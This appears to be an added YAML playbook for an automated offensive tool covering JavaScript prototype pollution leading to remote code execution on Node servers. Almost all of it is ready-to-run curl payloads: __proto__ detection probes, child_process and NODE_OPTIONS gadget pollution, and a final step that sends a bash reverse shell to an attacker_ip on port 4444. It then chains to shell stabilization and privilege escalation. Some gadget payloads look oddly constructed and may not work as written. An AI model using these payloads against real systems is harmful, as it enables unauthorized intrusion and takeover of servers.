@@ -1,0 +1,96 @@
+id: prototype-pollution-rce
+name: "Web — JavaScript prototype pollution → RCE"
+description: >
+  Server-side Node apps that recursively merge user input into objects
+  (lodash.merge, jQuery.extend(true), $.extend) can have Object.prototype
+  poisoned. Many libraries then read that polluted property as a config
+  knob → flip it to spawn a shell.
+tags: [web, javascript, nodejs, prototype-pollution, rce]
+difficulty: hard
+
+inputs:
+  - name: target_url
+    description: "Endpoint that accepts JSON and merges it into objects (often /api/profile, /api/settings)."
+    required: true
+
+steps:
+  - id: detect_pollution
+    name: "Detect pollution via __proto__"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/json' \
+        -d '{"__proto__":{"polluted":"yes"}}'
+      # Then fetch any endpoint that returns a fresh object and check whether
+      # the response unexpectedly includes "polluted":"yes".
+    inputs:
+      url: "${target_url}"
+    notes: |
+      Some apps strip `__proto__`. Try `constructor.prototype` instead:
+        {"constructor":{"prototype":{"polluted":"yes"}}}
+
+  - id: blind_detection
+    name: "Blind detection: pollute toString, watch for crash"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/json' \
+        -d '{"__proto__":{"toString":7}}'
+    notes: |
+      If the next request fails with `TypeError: ... toString is not a function`
+      → confirmed pollution.
+
+  - id: rce_via_argv
+    name: "RCE via child_process gadget (most common payload)"
+    inline_command: |
+      # Many apps use child_process.spawn(...) with no options.shell;
+      # polluting Object.prototype.shell = '/usr/bin/bash' (or true) +
+      # NODE_OPTIONS gives RCE on the next spawn.
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/json' \
+        -d '{"__proto__":{"shell":true,"argv0":"sh"}}'
+    inputs:
+      url: "${target_url}"
+
+  - id: rce_via_env
+    name: "RCE via NODE_OPTIONS env var pollution"
+    inline_command: |
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/json' \
+        -d '{"__proto__":{"NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229 --require /tmp/payload.js"}}'
+      # Then either trigger any child_process call OR connect to inspect port:
+      # chromium chrome://inspect → expose attach → RCE.
+
+  - id: gadget_lookup
+    name: "Find a known gadget for this app's framework"
+    inline_command: |
+      git clone https://github.com/BlackFan/client-side-prototype-pollution /tmp/cspp
+      # And:
+      git clone https://github.com/yeswehack/pp-finder /tmp/pp-finder
+      # The repos catalog gadgets per framework (Express, NestJS, Next.js, etc.)
+      # Pick the one matching the target's stack and tailor the pollution payload.
+
+  - id: confirm_rce
+    name: "Trigger a reverse shell"
+    inline_command: |
+      # After pollution, trigger any endpoint that does spawn/exec internally.
+      # Combined gadget example for Express (lodash.merge + NODE_OPTIONS):
+      curl -X POST '<url>' \
+        -H 'Content-Type: application/json' \
+        -d '{"__proto__":{"AppData":"\\\".concat(process.mainModule.require(\"child_process\").execSync(\"bash -c \\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\"\")).concat(\"."}}'
+    inputs:
+      url: "${target_url}"
+      lhost: "${attacker_ip}"
+      lport: "4444"
+
+references:
+  - title: "PortSwigger — Prototype pollution"
+    url:   "https://portswigger.net/web-security/prototype-pollution"
+  - title: "client-side-prototype-pollution gadgets"
+    url:   "https://github.com/BlackFan/client-side-prototype-pollution"
+
+next_chains:
+  - chain: shell-stabilization
+    when:   'reverse shell received'
+    reason: 'Stabilize.'
+  - chain: linux-priv-esc-recon
+    when:   'shell on Node host'
+    reason: 'Escalate from node user.'
